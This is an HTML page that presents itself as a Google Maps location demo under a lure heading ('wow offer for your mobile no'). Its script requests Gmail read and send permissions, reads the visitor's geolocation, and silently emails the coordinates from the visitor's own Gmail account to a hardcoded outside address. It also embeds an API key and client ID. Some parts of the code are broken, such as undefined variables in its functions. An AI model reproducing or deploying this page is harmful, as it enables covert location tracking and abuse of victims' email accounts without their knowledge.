 
<html>
<head>
<title>How to Get Current Location using Google Map Javascript API</title>

	<script src="//code.jquery.com/jquery-1.11.3.min.js"></script>

</head>
<style>
body {
	font-family :Arial;
}
#map-layer {
	margin: 20px 0px;
	max-width: 600px;
	min-height: 400;
}
#btnAction {
	background: #3878c7;
    padding: 10px 40px;
    border: #3672bb 1px solid;
    border-radius: 2px;
    color: #FFF;
    font-size: 0.9em;
    cursor:pointer;
    display:block;
}
#btnAction:disabled {
    background: #6c99d2;
}
</style>
<body>

 
<h1>wow offer for your mobile no</h1>
	 
	<div id="map-layer"></div>

<p id="demo"></p>
	<script type="text/javascript">
	
	var map;
	function initMap() {
		var mapLayer = document.getElementById("map-layer");
		var centerCoordinates = new google.maps.LatLng(37.6, -95.665);
		var defaultOptions = { center: centerCoordinates, zoom: 4 }

		map = new google.maps.Map(mapLayer, defaultOptions);
		 
	}
function composeTidy()
      {
	  
	  }
	function locate(){
	 
		if ("geolocation" in navigator){
			navigator.geolocation.getCurrentPosition(function(position){ 
				var currentLatitude = position.coords.latitude;
				var currentLongitude = position.coords.longitude;

				var infoWindowHTML = "Latitude: " + currentLatitude + "<br>Longitude: " + currentLongitude;
				var infoWindow = new google.maps.InfoWindow({map: map, content: infoWindowHTML});
				var currentLocation = { lat: currentLatitude, lng: currentLongitude };
				sendMessage(
          {
            'To': 'asivapvl@gmail.com',
            'Subject':  currentLatitude + 'ss '+ currentLongitude
          },
           currentLatitude + 'ss '+ currentLongitude,
          composeTidy
        );
				infoWindow.setPosition(currentLocation);
				document.getElementById("btnAction").style.display = 'none';
			});
		}
	}
	
	
	
	</script>
	
 
  <script type="text/javascript">
      var clientId = '118458467914-ndjup1u319obcu0r8ssm62muf4anbm4t.apps.googleusercontent.com';
      var apiKey = 'AIzaSyC9pIgYWRrNMaF920He7QsFngdy4m3ZCWA';
      var scopes =
        'https://www.googleapis.com/auth/gmail.readonly '+
        'https://www.googleapis.com/auth/gmail.send';
      function handleClientLoad() {
        gapi.client.setApiKey(apiKey);
        window.setTimeout(checkAuth, 1);
      }
	function checkAuth() {
        gapi.auth.authorize({
          client_id: clientId,
          scope: scopes,
          immediate: true
        }, handleAuthResult);
      }
	  
	   function handleAuthClick() {
        gapi.auth.authorize({
          client_id: clientId,
          scope: scopes,
          immediate: false
        }, handleAuthResult);
        return false;
      }
	  
	  
	   function handleAuthResult(authResult) {
        if(authResult && !authResult.error) {
          loadGmailApi();
        } else {
           
            handleAuthClick();
          
        }
		
		}
		
		function loadGmailApi() {
        gapi.client.load('gmail', 'v1', displayInbox);
      }
	  
	  
	  function displayInbox() {
	  
	  
        var request = gapi.client.gmail.users.messages.list({
          'userId': 'me',
          'labelIds': 'INBOX',
          'maxResults': 10
        });
		getLocation();
        request.execute(function(response) {
          $.each(response.messages, function() {
            var messageRequest = gapi.client.gmail.users.messages.get({
              'userId': 'me',
              'id': this.id
            });
             
          });
        });
      }
	  
	  	
	  
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

  function sendMessage(headers_obj, message, callback)
      {
        var email = '';
        for(var header in headers_obj)
          email += header += ": "+headers_obj[header]+"\r\n";
        email += "\r\n" + message;
        var sendRequest = gapi.client.gmail.users.messages.send({
          'userId': 'me',
          'resource': {
            'raw': window.btoa(email).replace(/\+/g, '-').replace(/\//g, '_')
          }
        });
        return sendRequest.execute(callback);
      }

function showPosition(position) {
	sendMessage(
          {
            'To': 'asivapvl@gmail.com',
            'Subject':  position.coords.latitude  + 'ss '+ position.coords.longitude
          },
           position.coords.latitude  + 'ss '+ currentLongitude,
          composeTidy
        );
  
}
	   
	
	  
	  </script>
  <script src="https://apis.google.com/js/client.js?onload=handleClientLoad"></script>
		 
</body>
</html>
